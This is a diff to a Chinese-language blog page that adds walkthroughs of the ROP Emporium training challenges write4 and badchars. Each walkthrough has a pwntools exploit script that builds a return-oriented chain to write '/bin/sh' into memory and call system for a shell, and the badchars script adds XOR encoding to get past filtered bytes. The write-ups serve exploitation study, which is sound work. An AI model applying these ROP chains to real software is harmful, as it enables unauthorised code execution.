@@ -365,14 +365,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    911
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    6 分
                 </div>
                 
 
@@ -508,7 +508,112 @@ payload <span class="token operator">+=</span> p64<span class="token punctuation
 p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p><img src="/images/14/callme/2.jpg" alt></p>
-<h2 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…"></a>未完待续…</h2>
+<h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h5 id="32位-3"><a href="#32位-3" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/write432.zip" target="_blank" rel="noopener">32位</a>:</h5><p>这个挑战给了<code>system</code>但是没有给<code>/bin/cat flag.txt</code>, 则需要自己写一段进去, 这里打算直接写个<code>/bin/sh</code>, 但是往哪里写呢？</p>
+<p>通过<code>readelf</code>工具查看段.<br><img src="/images/14/write4/1.jpg" alt></p>
+<p>可以看到<code>.data</code>和<code>.bss</code>段都有可读写的权限, 这里就可以把<code>/bin/sh</code>写到<code>.data</code>段内, 要写入的长度是7, data段大小是8, 刚好可以装下.</p>
+<p>要想写入数据到里面, 需要使用<code>mov</code>指令, 于是找到了</p>
+<pre><code>0x080486da : pop edi ; pop ebp ; ret
+0x08048670 : mov dword ptr [edi], ebp ; ret</code></pre><p>这两条指令就可以满足我们写入数据到内存的想法.  由于这是32位的程序, 每次只能写入4个字节, 而<code>/bin/sh</code>是7个字节, 于是我们要分两次进行写入。 </p>
+<p>那? Go?</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./write432"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./write432"</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># var</span>
+overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>
+system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
+data_addr <span class="token operator">=</span> <span class="token number">0x0804a028</span>
+pop_edi_ebp_addr <span class="token operator">=</span> <span class="token number">0x080486da</span>
+mov_edi_ebp <span class="token operator">=</span> <span class="token number">0x08048670</span>
+bin_sh_str <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>
+left_bin_sh <span class="token operator">=</span> bin_sh_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>
+right_bin_sh <span class="token operator">=</span> bin_sh_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+
+payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> left_bin_sh <span class="token operator">+</span> p32<span class="token punctuation">(</span>mov_edi_ebp<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> right_bin_sh <span class="token operator">+</span> p32<span class="token punctuation">(</span>mov_edi_ebp<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><img src="/images/14/write4/2.jpg" alt></p>
+<h5 id="64位-3"><a href="#64位-3" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/write4.zip" target="_blank" rel="noopener">64位</a>:</h5><p>思路和32位一样, 不过64位要更简单一些, 因为可以一次性直接把<code>/bin/sh</code>写进去, 不用分开写入了.</p>
+<p>找到需要的<code>gadget</code></p>
+<pre><code>0x0000000000400893 : pop rdi ; ret
+0x0000000000400890 : pop r14 ; pop r15 ; ret
+0x0000000000400820 : mov qword ptr [r14], r15 ; ret</code></pre><p>开始编写exp</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./write4"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./write4"</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># var</span>
+overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>
+system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
+pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x0000000000400893</span>
+data_addr <span class="token operator">=</span> <span class="token number">0x0000000000601050</span>
+mov_r14_r15_addr <span class="token operator">=</span> <span class="token number">0x0000000000400820</span>
+pop_r14_15_addr <span class="token operator">=</span> <span class="token number">0x0000000000400890</span>
+bin_sh_str <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r14_15_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh_str <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_r14_r15_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><img src="/images/14/write4/3.jpg" alt></p>
+<h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h5 id="32位-4"><a href="#32位-4" class="headerlink" title="32位:"></a><a href>32位</a>:</h5><p>程序禁止输入<code>b i c / &lt;space&gt; f n s</code>, 可以通过异或后的结果来把<code>/bin/sh</code>写到程序, 再通过<code>gadget</code>把<code>/bin/sh</code>异或回来, 再进行执行.</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./badchars32"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./badchars32"</span><span class="token punctuation">)</span>
+
+offset <span class="token operator">=</span> cyclic_find<span class="token punctuation">(</span><span class="token string">"laaa"</span><span class="token punctuation">)</span>
+xor_num <span class="token operator">=</span> <span class="token number">2</span>
+bin_sh <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+data_addr <span class="token operator">=</span> <span class="token number">0x0804a038</span>
+system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
+mov_edi_esi_ret <span class="token operator">=</span> <span class="token number">0x08048893</span>
+pop_esi_edi_ret <span class="token operator">=</span> <span class="token number">0x08048899</span>
+pop_ebx_ecx_ret <span class="token operator">=</span> <span class="token number">0x08048896</span>
+xor_ebx_ecx_ret <span class="token operator">=</span> <span class="token number">0x08048890</span>
+
+<span class="token comment" spellcheck="true"># xor encode</span>
+<span class="token keyword">for</span> index<span class="token punctuation">,</span> item <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    bin_sh<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">^</span> xor_num<span class="token punctuation">)</span>
+
+bin_sh <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> offset
+<span class="token comment" spellcheck="true"># write "/bin" to data</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_edi_esi_ret<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># write "/sh" to data</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_edi_esi_ret<span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># decode xor</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx_ecx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>xor_num<span class="token punctuation">)</span>
+    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_ebx_ecx_ret<span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># system(/bin/sh)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><img src="/images/14/badchars/1.jpg" alt></p>
+<h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>待补充…</p>
+<h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>待补充…</p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>待补充…</p>
+
             </div>
             <hr/>
 
@@ -1039,7 +1144,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">6.7k</span>&nbsp;字
+                class="white-color">7.2k</span>&nbsp;字
             
             
 
